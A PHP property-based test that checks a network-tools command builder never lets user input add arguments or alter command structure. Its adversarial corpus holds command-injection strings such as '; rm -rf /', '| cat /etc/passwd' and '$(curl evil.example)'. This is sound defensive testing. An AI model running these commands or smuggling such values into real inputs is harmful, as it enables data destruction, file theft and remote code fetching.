<?php
/**
 * Feature: research-tools, Property 8: Command builder never allows argument injection
 *
 * For any tool input string (including shell metacharacters such as `;`, `|`, `&`,
 * `$`, backticks, quotes, spaces, and newlines, plus unicode), the constructed
 * command SHALL be an argument vector whose fixed positions equal the tool's fixed
 * arguments and in which the user input occupies exactly one argument slot equal to
 * the input verbatim (for argument-style tools), or is confined to a single/known
 * discrete argv element as a verbatim substring (for URL/host-style tools), so the
 * input can never introduce new argv elements or alter the command structure.
 *
 * Validates: Requirements 6.6, 8.12
 *
 * Standalone PHP property test (no PHPUnit / composer). Run:  php CommandBuilderInjectionPropertyTest.php
 *
 * Strategy (differential structural check):
 *   For each tool we build a BASELINE argv using a unique sentinel MARKER as the
 *   user input, and an ADVERSARIAL argv using a generated malicious input. Because
 *   only the user input differs between the two builds, the two argument vectors
 *   MUST:
 *     1. be flat lists of strings (sequential integer keys),
 *     2. have identical length (the input never adds/removes argv elements),
 *     3. leave every "fixed" element (one that does not embed the marker) byte-for-byte
 *        identical to the baseline, and
 *     4. reproduce every "template" element (one that embeds the marker) exactly by
 *        substituting the input for the marker - proving the input appears verbatim
 *        and is confined to that single element.
 *   This simultaneously proves the fixed positions are untouched and that the user
 *   input occupies exactly the slot(s) the builder intends, verbatim.
 */

require_once __DIR__ . '/../CommandBuilder.php';

/* -------------------------------------------------------------------------- */
/* Test harness                                                               */
/* -------------------------------------------------------------------------- */

$GLOBALS['__assertions'] = 0;
$GLOBALS['__failures']   = [];

/**
 * Record an assertion; on failure capture a descriptive counterexample.
 */
function check(bool $cond, string $message): void {
    $GLOBALS['__assertions']++;
    if (!$cond) {
        $GLOBALS['__failures'][] = $message;
    }
}

/** Render a value for counterexample output (control chars made visible). */
function reprv($v): string {
    if (is_array($v)) {
        $parts = array_map('reprv', $v);
        return '[' . implode(', ', $parts) . ']';
    }
    $s = (string)$v;
    $s = str_replace(["\0", "\n", "\r", "\t"], ['\\0', '\\n', '\\r', '\\t'], $s);
    return "'" . $s . "'";
}

/* -------------------------------------------------------------------------- */
/* Adversarial input generator                                                */
/* -------------------------------------------------------------------------- */

/**
 * A sentinel marker used as the "user input" for the baseline build. It uses a
 * Unicode Private Use Area codepoint so it cannot collide with any generated
 * adversarial input, any fixed argument text, or any metacharacter.
 */
const INJECT_MARKER = "\u{E000}__MARKER__\u{E000}";

/** Metacharacter / dangerous fragments that MUST stay inert as data. */
const NASTY_FRAGMENTS = [
    ';', '|', '&', '&&', '||', '$', '`', '$(', ')', '{', '}', '<', '>', '>>',
    '"', "'", '\\', ' ', "\t", "\n", "\r", "\r\n", '#', '*', '?', '~', '!',
    '$(whoami)', '`id`', '; rm -rf /', '| cat /etc/passwd', '&& reboot',
    '$(curl evil.example)', '\n@8.8.8.8', ' -x ', '--output=/etc/x',
    '"; touch pwned; "', "' OR '1'='1", '$PATH', '${IFS}', '%0a', '\u{202E}',
    'a b c', 'foo bar', 'ünïcödé', '日本語', '😀💥', "line1\nline2",
];

/**
 * Deterministic corpus of hand-picked adversarial strings guaranteeing coverage
 * of every required metacharacter class.
 */
function fixedAdversarialCorpus(): array {
    $corpus = [];
    foreach (NASTY_FRAGMENTS as $f) {
        $corpus[] = $f;
        $corpus[] = 'example.com' . $f;
        $corpus[] = $f . 'example.com';
        $corpus[] = 'a' . $f . 'b';
    }
    return $corpus;
}

/**
 * Generate a random adversarial string built from letters, digits and the full
 * set of shell metacharacters, quotes, whitespace/newlines and unicode.
 */
function randomAdversarial(): string {
    $alphabet = [
        // shell metacharacters
        ';', '|', '&', '$', '`', '(', ')', '{', '}', '<', '>', '#', '*', '?',
        '!', '~', '\\',
        // quotes
        '"', "'",
        // whitespace / newlines
        ' ', "\t", "\n", "\r",
        // ordinary domain-ish chars
        'a', 'b', 'c', 'x', '9', '0', '.', '-', '_', 'A', 'Z',
        // unicode
        'ü', 'é', '中', '文', '😀', "\u{202E}", "\u{00A0}",
    ];
    $n = mt_rand(1, 40);
    $s = '';
    for ($i = 0; $i < $n; $i++) {
        $s .= $alphabet[mt_rand(0, count($alphabet) - 1)];
    }
    return $s;
}

/* -------------------------------------------------------------------------- */
/* Tool invocation helpers                                                    */
/* -------------------------------------------------------------------------- */

/**
 * The tools under test and how to feed a single user-input string into build().
 * Each entry returns the params array for CommandBuilder::build($tool, $params)
 * given the user input string.
 *
 * - Argument-style tools:   rdap*, dig, ping, traceroute, reverse_dns, nsmx
 * - URL/host-style tools:   rdap, geoip, asn, tls_cert, reputation, website_preview
 *
 * For website_preview the output path and profile directory are server-generated
 * (fixed, not user input), so we pin them to constants for both the baseline and
 * the adversarial builds.
 */
function toolInvocations(string $input): array {
    return [
        'rdap'            => ['target' => $input],
        'dig'             => ['target' => $input],
        'ping'            => ['target' => $input],
        'traceroute'      => ['target' => $input],
        'reverse_dns'     => ['target' => $input],
        'nsmx'            => ['target' => $input],
        'geoip'           => ['target' => $input],
        'asn'             => ['target' => $input],
        'tls_cert'        => ['target' => $input],
        'reputation'      => ['target' => $input],
        'website_preview' => [
            'target'      => $input,
            'output_path' => '/tmp/rpidns_preview.png',
            'profile_dir' => '/tmp/rpidns_preview.profile',
        ],
    ];
}

/* -------------------------------------------------------------------------- */
/* Core differential structural check                                         */
/* -------------------------------------------------------------------------- */

/**
 * Assert that a single argv array is a flat list of strings with sequential keys.
 */
function assertFlatStringList(array $argv, string $ctx): void {
    $expectedKey = 0;
    $ok = true;
    foreach ($argv as $k => $v) {
        if ($k !== $expectedKey || !is_string($v)) {
            $ok = false;
            break;
        }
        $expectedKey++;
    }
    check($ok, "{$ctx}: argv must be a flat, sequential list of strings, got " . reprv($argv));
}

/**
 * Differentially compare a baseline argv (built with the marker) against an
 * adversarial argv (built with malicious input), enforcing Property 8.
 */
function assertArgvStructure(array $baseArgv, array $advArgv, string $input, string $ctx): void {
    assertFlatStringList($baseArgv, $ctx . ' [baseline]');
    assertFlatStringList($advArgv, $ctx . ' [adversarial]');

    // (2) The user input never changes the number of argv elements.
    check(
        count($baseArgv) === count($advArgv),
        "{$ctx}: input changed argv length (baseline=" . count($baseArgv)
            . ", adversarial=" . count($advArgv) . ") for input " . reprv($input)
            . "; baseline=" . reprv($baseArgv) . " adversarial=" . reprv($advArgv)
    );
    if (count($baseArgv) !== count($advArgv)) {
        return; // further per-index checks would be meaningless
    }

    $embedCount = 0;   // how many argv elements embed the user input
    $verbatimSlotFound = false;

    $len = count($baseArgv);
    for ($i = 0; $i < $len; $i++) {
        $b = $baseArgv[$i];
        $a = $advArgv[$i];

        if (strpos($b, INJECT_MARKER) === false) {
            // (3) Fixed position: must be byte-for-byte identical.
            check(
                $b === $a,
                "{$ctx}: fixed argv[{$i}] changed under injection: expected " . reprv($b)
                    . " got " . reprv($a) . " for input " . reprv($input)
            );
        } else {
            // (4) Template element: substituting input for marker must reproduce it
            //     exactly - proving the input is embedded verbatim and confined here.
            $embedCount++;
            $reconstructed = str_replace(INJECT_MARKER, $input, $b);
            check(
                $reconstructed === $a,
                "{$ctx}: template argv[{$i}] not a verbatim single-slot embedding: "
                    . "expected " . reprv($reconstructed) . " got " . reprv($a)
                    . " for input " . reprv($input)
            );
            // The input must appear verbatim as a contiguous substring of this element.
            check(
                strpos($a, $input) !== false,
                "{$ctx}: input not present verbatim in argv[{$i}]=" . reprv($a)
                    . " for input " . reprv($input)
            );
            // For argument-style slots the element equals the input exactly.
            if ($a === $input) {
                $verbatimSlotFound = true;
            }
        }
    }

    // The user input must be used somewhere (never silently dropped) and must be
    // confined: at least one element embeds it.
    check(
        $embedCount >= 1,
        "{$ctx}: user input does not appear in any argv element for input " . reprv($input)
    );
}

/* -------------------------------------------------------------------------- */
/* Property driver                                                            */
/* -------------------------------------------------------------------------- */

/**
 * Build a tool for a given input and normalize to a list of argv arrays.
 * build() always returns string[][] (a list of argv arrays).
 */
function buildFor(CommandBuilder $builder, string $tool, string $input): array {
    $params = toolInvocations($input)[$tool];
    return $builder->build($tool, $params);
}

// Reproducible-but-varied generation.
mt_srand(20240608);

$builder = new CommandBuilder();

// Tools exercised by this property: every tool CommandBuilder can build.
$tools = [
    'rdap', 'dig', 'ping', 'traceroute', 'reverse_dns', 'nsmx',
    'geoip', 'asn', 'tls_cert', 'reputation', 'website_preview',
];

// Assemble the adversarial input set: the fixed corpus plus random inputs, for a
// large margin over the required minimum of 100 iterations.
$inputs = fixedAdversarialCorpus();
$RANDOM_INPUTS = 200;
for ($i = 0; $i < $RANDOM_INPUTS; $i++) {
    $inputs[] = randomAdversarial();
}

$iterations = 0;

foreach ($tools as $tool) {
    // Baseline built once per tool using the collision-proof marker.
    $baseCmds = buildFor($builder, $tool, INJECT_MARKER);

    foreach ($inputs as $input) {
        $iterations++;
        try {
            $advCmds = buildFor($builder, $tool, $input);
        } catch (\Throwable $e) {
            check(false, "tool={$tool}: build() threw for input " . reprv($input) . ": " . $e->getMessage());
            continue;
        }

        // The number of commands emitted must not depend on user input.
        check(
            count($baseCmds) === count($advCmds),
            "tool={$tool}: command count changed under injection (baseline="
                . count($baseCmds) . ", adversarial=" . count($advCmds) . ") for input " . reprv($input)
        );
        $nCmds = min(count($baseCmds), count($advCmds));
        for ($c = 0; $c < $nCmds; $c++) {
            assertArgvStructure(
                $baseCmds[$c],
                $advCmds[$c],
                $input,
                "tool={$tool} cmd#{$c}"
            );
        }
    }
}

/* -------------------------------------------------------------------------- */
/* Summary                                                                    */
/* -------------------------------------------------------------------------- */

$failures = $GLOBALS['__failures'];
$assertions = $GLOBALS['__assertions'];

echo str_repeat('=', 72), "\n";
echo "Feature: research-tools, Property 8 - argument-injection resistance\n";
echo str_repeat('-', 72), "\n";
echo "Tools exercised : " . count($tools) . " (" . implode(', ', $tools) . ")\n";
echo "Adversarial inputs: " . count($inputs) . " (corpus + {$RANDOM_INPUTS} random)\n";
echo "Iterations       : {$iterations} (tool x input)  [minimum required: 100]\n";
echo "Assertions        : {$assertions}\n";

if (empty($failures)) {
    echo str_repeat('-', 72), "\n";
    echo "RESULT: PASS - user input is always confined to discrete argv slots;\n";
    echo "        no adversarial input altered any fixed command structure.\n";
    echo str_repeat('=', 72), "\n";
    exit(0);
}

echo str_repeat('-', 72), "\n";
echo "RESULT: FAIL - " . count($failures) . " assertion(s) failed.\n";
echo "First failing counterexample(s):\n";
foreach (array_slice($failures, 0, 5) as $idx => $msg) {
    echo "  [" . ($idx + 1) . "] {$msg}\n";
}
echo str_repeat('=', 72), "\n";
exit(1);
